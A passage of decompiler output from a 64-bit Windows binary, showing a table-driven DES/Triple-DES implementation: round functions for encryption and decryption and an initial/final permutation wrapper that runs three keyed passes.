                                                                                     + 128) ^ *((_DWORD *)&unk_140111E00
                                                                                              + (((v7 ^ (unsigned __int64)a2[2]) >> 18) & 0x3F)
                                                                                              + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v8 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v8 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v8 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v7 ^ (unsigned __int64)a2[2]) >> 2) & 0x3F)) ^ v3;
    v10 = __ROR4__(v9 ^ a2[5], 4);
    v11 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v10 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v9 ^ (unsigned __int64)a2[4]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v10 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v10 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v9 ^ (unsigned __int64)a2[4]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v9 ^ (unsigned __int64)a2[4]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v10 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v9 ^ (unsigned __int64)a2[4]) >> 2) & 0x3F)) ^ v7;
    v12 = __ROR4__(v11 ^ a2[7], 4);
    v13 = v11 ^ (unsigned __int64)a2[6];
    v14 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v12 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v13 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v12 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v12 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v12 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v13 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v13 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v13 >> 18) & 0x3F) + 256) ^ v9;
    v15 = __ROR4__(v14 ^ a2[9], 4);
    v16 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v15 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v14 ^ (unsigned __int64)a2[8]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v15 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v15 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v14 ^ (unsigned __int64)a2[8]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v14 ^ (unsigned __int64)a2[8]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v15 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v14 ^ (unsigned __int64)a2[8]) >> 2) & 0x3F)) ^ v11;
    v17 = __ROR4__(v16 ^ a2[11], 4);
    v18 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v17 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v16 ^ (unsigned __int64)a2[10]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v17 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v17 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v16 ^ (unsigned __int64)a2[10]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v16 ^ (unsigned __int64)a2[10]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v17 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v16 ^ (unsigned __int64)a2[10]) >> 2) & 0x3F)) ^ v14;
    v19 = __ROR4__(v18 ^ a2[13], 4);
    v20 = v18 ^ (unsigned __int64)a2[12];
    v21 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v19 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v20 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v19 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v20 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v19 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v19 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v20 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v20 >> 18) & 0x3F) + 256) ^ v16;
    v22 = __ROR4__(v21 ^ a2[15], 4);
    v23 = v21 ^ (unsigned __int64)a2[14];
    v24 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v22 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v23 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v22 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v23 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v22 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v22 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v23 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v23 >> 18) & 0x3F) + 256) ^ v18;
    v25 = __ROR4__(v24 ^ a2[17], 4);
    v26 = v24 ^ (unsigned __int64)a2[16];
    v27 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v25 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v26 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v25 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v26 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v25 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v25 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v26 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v26 >> 18) & 0x3F) + 256) ^ v21;
    v28 = v27 ^ (unsigned __int64)a2[18];
    v29 = __ROR4__(v27 ^ a2[19], 4);
    v30 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v29 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v28 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v29 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v28 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v29 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v29 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v28 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v28 >> 18) & 0x3F) + 256) ^ v24;
    v31 = __ROR4__(v30 ^ a2[21], 4);
    v32 = v30 ^ (unsigned __int64)a2[20];
    v33 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v31 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v32 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v31 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v32 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v31 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v31 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v32 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v32 >> 18) & 0x3F) + 256) ^ v27;
    v34 = __ROR4__(v33 ^ a2[23], 4);
    v35 = v33 ^ (unsigned __int64)a2[22];
    v36 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v34 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v35 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v34 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v35 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v34 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v34 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v35 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v35 >> 18) & 0x3F) + 256) ^ v30;
    v37 = __ROR4__(v36 ^ a2[25], 4);
    v38 = v36 ^ (unsigned __int64)a2[24];
    v39 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v37 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v38 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v37 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v38 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v37 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v37 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v38 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v38 >> 18) & 0x3F) + 256) ^ v33;
    v40 = __ROR4__(v39 ^ a2[27], 4);
    v41 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v40 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v39 ^ (unsigned __int64)a2[26]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v40 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v40 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v39 ^ (unsigned __int64)a2[26]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v39 ^ (unsigned __int64)a2[26]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v40 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v39 ^ (unsigned __int64)a2[26]) >> 2) & 0x3F)) ^ v36;
    v42 = __ROR4__(v41 ^ a2[29], 4);
    v43 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v42 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v41 ^ (unsigned __int64)a2[28]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v42 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v42 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v41 ^ (unsigned __int64)a2[28]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v41 ^ (unsigned __int64)a2[28]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v42 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v41 ^ (unsigned __int64)a2[28]) >> 2) & 0x3F)) ^ v39;
    v44 = (unsigned int)__ROR4__(v43 ^ a2[31], 4);
    v45 = v43 ^ (unsigned __int64)a2[30];
    result = (unsigned __int16)v44 >> 10;
    v47 = *((_DWORD *)&unk_140111E00 + result + 192) ^ *((_DWORD *)&unk_140111E00
                                                       + (((unsigned int)v44 >> 18) & 0x3F)
                                                       + 320) ^ *((_DWORD *)&unk_140111E00
                                                                + ((unsigned __int16)v45 >> 10)
                                                                + 128) ^ *((_DWORD *)&unk_140111E00
                                                                         + ((v45 >> 18) & 0x3F)
                                                                         + 256) ^ *((_DWORD *)&unk_140111E00
                                                                                  + ((unsigned __int8)v44 >> 2)
                                                                                  + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                          + ((unsigned __int8)v45 >> 2));
  }
  else
  {
    v48 = v3 ^ (unsigned __int64)a2[30];
    v49 = __ROR4__(v3 ^ a2[31], 4);
    v50 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v49 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v48 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v49 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v49 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v48 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v48 >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v49 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v48 >> 2)) ^ v4;
    v51 = __ROR4__(v50 ^ a2[29], 4);
    v52 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v51 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v50 ^ (unsigned __int64)a2[28]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v51 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v51 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v50 ^ (unsigned __int64)a2[28]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v50 ^ (unsigned __int64)a2[28]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v51 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v50 ^ (unsigned __int64)a2[28]) >> 2) & 0x3F)) ^ v3;
    v53 = __ROR4__(v52 ^ a2[27], 4);
    v54 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v53 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v52 ^ (unsigned __int64)a2[26]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v53 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v53 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v52 ^ (unsigned __int64)a2[26]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v52 ^ (unsigned __int64)a2[26]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v53 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v52 ^ (unsigned __int64)a2[26]) >> 2) & 0x3F)) ^ v50;
    v55 = __ROR4__(v54 ^ a2[25], 4);
    v56 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v55 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v54 ^ (unsigned __int64)a2[24]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v55 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v55 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v54 ^ (unsigned __int64)a2[24]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v54 ^ (unsigned __int64)a2[24]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v55 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v54 ^ (unsigned __int64)a2[24]) >> 2) & 0x3F)) ^ v52;
    v57 = __ROR4__(v56 ^ a2[23], 4);
    v58 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v57 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + ((v56 ^ (unsigned __int64)a2[22]) >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int16)v57 >> 10)
                                                                                       + 192) ^ *((_DWORD *)&unk_140111E00
                                                                                                + ((v57 >> 18) & 0x3F)
                                                                                                + 320) ^ *((_DWORD *)&unk_140111E00 + (((v56 ^ (unsigned __int64)a2[22]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v56 ^ (unsigned __int64)a2[22]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v57 >> 2) + 64) ^ *((_DWORD *)&unk_140111E00 + (((v56 ^ (unsigned __int64)a2[22]) >> 2) & 0x3F)) ^ v54;
    LODWORD(v48) = __ROR4__(v58 ^ a2[21], 4);
    v59 = *((_DWORD *)&unk_140111E00 + ((v58 ^ (unsigned __int64)a2[20]) >> 26) + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                         + ((unsigned __int64)(unsigned int)v48 >> 26)
                                                                                         + 448) ^ *((_DWORD *)&unk_140111E00
                                                                                                  + (((v58 ^ (unsigned __int64)a2[20]) >> 2) & 0x3F)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v48 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + (((unsigned int)v48 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + (((v58 ^ (unsigned __int64)a2[20]) >> 10) & 0x3F) + 128) ^ *((_DWORD *)&unk_140111E00 + (((v58 ^ (unsigned __int64)a2[20]) >> 18) & 0x3F) + 256) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v48 >> 2) + 64) ^ v56;
    v60 = __ROR4__(v59 ^ a2[19], 4);
    v61 = v59 ^ (unsigned __int64)a2[18];
    v62 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v60 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v61 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v60 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v61 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v60 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v60 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v61 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v61 >> 18) & 0x3F) + 256) ^ v58;
    v63 = __ROR4__(v62 ^ a2[17], 4);
    v64 = v62 ^ (unsigned __int64)a2[16];
    v65 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v63 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v64 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v63 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v64 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v63 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v63 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v64 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v64 >> 18) & 0x3F) + 256) ^ v59;
    v66 = __ROR4__(v65 ^ a2[15], 4);
    v67 = v65 ^ (unsigned __int64)a2[14];
    v68 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v66 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v67 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v66 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v67 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v66 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v66 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v67 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v67 >> 18) & 0x3F) + 256) ^ v62;
    v69 = v68 ^ (unsigned __int64)a2[12];
    v70 = __ROR4__(v68 ^ a2[13], 4);
    v71 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v70 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v69 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v70 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v69 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v70 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v70 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v69 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v69 >> 18) & 0x3F) + 256) ^ v65;
    v72 = __ROR4__(v71 ^ a2[11], 4);
    v73 = v71 ^ (unsigned __int64)a2[10];
    v74 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v72 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v73 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v72 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v73 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v72 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v72 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v73 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v73 >> 18) & 0x3F) + 256) ^ v68;
    v75 = __ROR4__(v74 ^ a2[9], 4);
    v76 = v74 ^ (unsigned __int64)a2[8];
    v77 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v75 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v76 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v75 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v76 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v75 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v75 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v76 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v76 >> 18) & 0x3F) + 256) ^ v71;
    v78 = __ROR4__(v77 ^ a2[7], 4);
    v79 = v77 ^ (unsigned __int64)a2[6];
    v80 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v78 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v79 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v78 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v79 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v78 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v78 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v79 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v79 >> 18) & 0x3F) + 256) ^ v74;
    v81 = __ROR4__(v80 ^ a2[5], 4);
    v82 = v80 ^ (unsigned __int64)a2[4];
    v41 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v81 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v82 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v81 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v82 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v81 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v81 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v82 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v82 >> 18) & 0x3F) + 256) ^ v77;
    v83 = v41 ^ (unsigned __int64)a2[2];
    v84 = __ROR4__(v41 ^ a2[3], 4);
    v43 = *((_DWORD *)&unk_140111E00 + ((unsigned __int64)v84 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00
                                                                              + (v83 >> 26)
                                                                              + 384) ^ *((_DWORD *)&unk_140111E00
                                                                                       + ((unsigned __int8)v84 >> 2)
                                                                                       + 64) ^ *((_DWORD *)&unk_140111E00
                                                                                               + ((unsigned __int8)v83 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v84 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + ((v84 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v83 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v83 >> 18) & 0x3F) + 256) ^ v80;
    v44 = (unsigned int)__ROR4__(v43 ^ a2[1], 4);
    v45 = v43 ^ (unsigned __int64)*a2;
    result = (unsigned __int8)v44 >> 2;
    v47 = *((_DWORD *)&unk_140111E00 + result + 64) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int8)v45 >> 2)) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v44 >> 10) + 192) ^ *((_DWORD *)&unk_140111E00 + (((unsigned int)v44 >> 18) & 0x3F) + 320) ^ *((_DWORD *)&unk_140111E00 + ((unsigned __int16)v45 >> 10) + 128) ^ *((_DWORD *)&unk_140111E00 + ((v45 >> 18) & 0x3F) + 256);
  }
  a1[1] = __ROR4__(
            *((_DWORD *)&unk_140111E00 + (v44 >> 26) + 448) ^ *((_DWORD *)&unk_140111E00 + (v45 >> 26) + 384) ^ v47 ^ v41,
            3);
  *a1 = __ROR4__(v43, 3);
  return result;
}

//----- (00000001400858A0) ----------------------------------------------------
__int64 __fastcall sub_1400858A0(unsigned int *a1, unsigned int *a2, unsigned int *a3, unsigned int *a4)
{
  int v6; // eax
  int v8; // r10d
  int v9; // r11d
  int v10; // ecx
  unsigned int v11; // r11d
  int v12; // r10d
  int v13; // eax
  unsigned int v14; // r10d
  int v15; // r11d
  int v16; // eax
  unsigned int v17; // r11d
  int v18; // r10d
  int v19; // eax
  unsigned int v20; // edx
  int v21; // r8d
  int v22; // eax
  unsigned int v23; // r8d
  int v24; // edx
  int v25; // eax
  int v26; // edx
  int v27; // r8d
  int v28; // ecx
  unsigned int v29; // r8d
  int v30; // edx
  int v31; // eax
  int v32; // ecx
  __int64 result; // rax

  v6 = (*a1 ^ (a1[1] >> 4)) & 0xF0F0F0F;
  v8 = v6 ^ *a1;
  v9 = (16 * v6) ^ a1[1];
  v10 = (unsigned __int16)(v9 ^ HIWORD(v8));
  v11 = v10 ^ v9;
  v12 = (v10 << 16) ^ v8;
  v13 = (v12 ^ (v11 >> 2)) & 0x33333333;
  v14 = v13 ^ v12;
  v15 = (4 * v13) ^ v11;
  v16 = (v15 ^ (v14 >> 8)) & 0xFF00FF;
  v17 = v16 ^ v15;
  v18 = (v16 << 8) ^ v14;
  *a1 = v18 ^ (v18 ^ (v17 >> 1)) & 0x55555555;
  a1[1] = v17 ^ (2 * ((v18 ^ (v17 >> 1)) & 0x55555555));
  sub_140084620(a1, a2, 1);
  sub_140084620(a1, a3, 0);
  sub_140084620(a1, a4, 1);
  v19 = (*a1 ^ (a1[1] >> 1)) & 0x55555555;
  v20 = v19 ^ *a1;
  v21 = (2 * v19) ^ a1[1];
  v22 = (v21 ^ (v20 >> 8)) & 0xFF00FF;
  v23 = v22 ^ v21;
  v24 = (v22 << 8) ^ v20;
  v25 = (v24 ^ (v23 >> 2)) & 0x33333333;
  v26 = v25 ^ v24;
  v27 = (4 * v25) ^ v23;
  v28 = (unsigned __int16)(v27 ^ HIWORD(v26));
  v29 = v28 ^ v27;
  v30 = (v28 << 16) ^ v26;
  v31 = (v30 ^ (v29 >> 4)) & 0xF0F0F0F;
  v32 = 16 * v31;
  result = v30 ^ (unsigned int)v31;
  *a1 = result;
  a1[1] = v29 ^ v32;
  return result;
}

//----- (0000000140085A00) ----------------------------------------------------
__int64 __fastcall sub_140085A00(
        unsigned __int16 *a1,
        __int64 a2,
        unsigned int a3,
        unsigned int *a4,
        unsigned __int16 *a5,
        int a6)
{
  unsigned int v9; // esi
  int v10; // r10d
  unsigned int v11; // r8d
